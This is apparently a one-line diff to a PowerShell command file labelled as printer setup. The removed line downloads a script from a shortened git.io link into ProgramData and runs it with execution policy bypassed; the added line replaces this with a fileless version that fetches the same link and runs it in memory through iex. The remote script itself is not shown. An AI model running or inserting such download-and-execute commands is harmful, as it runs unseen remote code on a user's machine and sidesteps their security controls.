@@ -1,1 +1,1 @@
-﻿Invoke-WebRequest -uri "https://git.io/JPM7E" -OutFile "$env:ProgramData\Printer-setup.ps1" -UseBasicParsing; cls; powershell -ep bypass "$env:ProgramData\Printer-setup.ps1"
+﻿iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JPM7E'))
